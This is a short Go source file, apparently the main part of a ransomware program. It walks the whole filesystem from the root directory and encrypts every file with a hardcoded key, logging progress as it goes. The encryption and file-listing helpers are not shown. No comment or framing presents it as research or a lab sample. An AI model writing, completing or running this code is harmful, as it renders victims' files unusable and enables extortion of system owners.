package main

import (
	"log"
)

func encryptFolder(files []string) int {
	cnt := 0
	key := []byte("dj1f5GMFlyp]x,f.git1`58fiSldtf,v")
	for _, filename := range files {
		log.Println("[*] Encrypting", filename)
		err := encrypt(filename, key)
		if err == nil {
			cnt++
		}
	}
	
	return cnt
}

func encryptSystem() {
	fileTree := fileList("/")
	cnt := encryptFolder(fileTree)
	log.Println("[!] Encrypted ", cnt, "files")
}

func main() {
	encryptSystem()
}